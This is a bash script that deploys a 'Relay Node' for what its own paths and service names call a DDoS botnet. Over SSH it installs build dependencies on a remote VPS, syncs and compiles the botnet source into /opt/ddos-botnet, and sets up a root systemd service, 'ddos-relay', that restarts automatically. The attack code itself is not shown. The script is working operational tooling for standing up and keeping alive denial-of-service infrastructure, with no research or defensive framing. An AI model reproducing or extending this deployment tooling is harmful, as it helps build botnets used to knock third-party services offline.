#!/bin/bash
# ==============================================================================
# Script Name: deploy_relay.sh
# Description: Automated deployment script for Relay Node on a remote VPS
# ==============================================================================

set -e

# Configuration Variables
REMOTE_USER="${REMOTE_USER:-root}"
REMOTE_HOST="${REMOTE_HOST:-}"
REMOTE_PORT="${REMOTE_PORT:-22}"
INSTALL_DIR="/opt/ddos-botnet"

if [ -z "$REMOTE_HOST" ]; then
    echo "[-] Error: REMOTE_HOST is not set."
    echo "Usage: REMOTE_HOST=192.168.1.50 ./deploy_relay.sh"
    exit 1
fi

echo "[+] Starting automated deployment of Relay Node to $REMOTE_HOST:$REMOTE_PORT..."

# 1. Update system packages and install dependencies
echo "[*] Installing dependencies on remote host..."
ssh -p "$REMOTE_PORT" "$REMOTE_USER@$REMOTE_HOST" << 'EOF'
    sudo apt-get update -y
    sudo apt-get install -y cmake build-essential libssl-dev libcurl4-openssl-dev protobuf-compiler libprotobuf-c-dev git
EOF

# 2. Create remote directory structure
echo "[*] Preparing remote directories..."
ssh -p "$REMOTE_PORT" "$REMOTE_USER@$REMOTE_HOST" "mkdir -p $INSTALL_DIR/build $INSTALL_DIR/config/crypto $INSTALL_DIR/logs"

# 3. Sync source files and configuration
echo "[*] Syncing project files to remote host..."
rsync -avz -e "ssh -p $REMOTE_PORT" --exclude 'logs/*' --exclude 'build/*' ./ "$REMOTE_USER@$REMOTE_HOST:$INSTALL_DIR/"

# 4. Build application on remote host
echo "[*] Compiling binaries on remote host..."
ssh -p "$REMOTE_PORT" "$REMOTE_USER@$REMOTE_HOST" << EOF
    cd "$INSTALL_DIR"
    mkdir -p build
    cd build
    cmake ..
    make -j\$(nproc)
EOF

# 5. Setup systemd service for Relay Node
echo "[*] Configuring systemd service for ddos-relay..."
ssh -p "$REMOTE_PORT" "$REMOTE_USER@$REMOTE_HOST" << 'EOF'
    sudo bash -c 'cat > /etc/systemd/system/ddos-relay.service << EOL
[Unit]
Description=DDOS Relay Node Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/ddos-botnet/build
ExecStart=/opt/ddos-botnet/build/ddos-relay --config /opt/ddos-botnet/config/relay.yaml
Restart=always
RestartSec=5
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=ddos-relay

[Install]
WantedBy=multi-user.target
EOL'

    sudo systemctl daemon-reload
    sudo systemctl enable ddos-relay
    sudo systemctl restart ddos-relay
EOF

echo "[+] Deployment completed successfully! Relay node is up and running."
